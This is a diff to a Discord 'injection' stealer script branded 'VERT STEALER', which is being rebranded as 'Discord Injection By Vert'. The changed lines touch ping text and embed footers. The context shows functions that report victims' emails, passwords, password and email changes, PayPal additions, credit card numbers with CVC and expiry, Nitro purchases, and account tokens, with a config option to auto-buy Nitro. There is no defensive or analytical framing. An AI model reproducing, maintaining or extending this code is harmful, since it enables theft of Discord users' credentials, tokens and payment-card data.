@@ -10,7 +10,7 @@ const config = {
   webhook_protector_key: '4REQADOYZ.OYK.OYKK.OYKK', 
   auto_buy_nitro: true,
   ping_on_run: true, 
-  ping_val: '@everyone Injection', 
+  ping_val: '@everyone', 
   embed_name: 'injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/961950134814535700/961987421879287878/IMG_9854.png'.replace(/ /g, '%20'), 
   embed_color: 8363488,
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: '🎉 Discord Injection By Vert',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: '🎉 Discord Injection By Vert',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: '🎉 Discord Injection By Vert',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: '🎉 Discord Injection By Vert',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: '🎉 Discord Injection By Vert',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'VERT STEALER',
+          text: '🎉 Discord Injection By Vert',
         },
       },
     ],
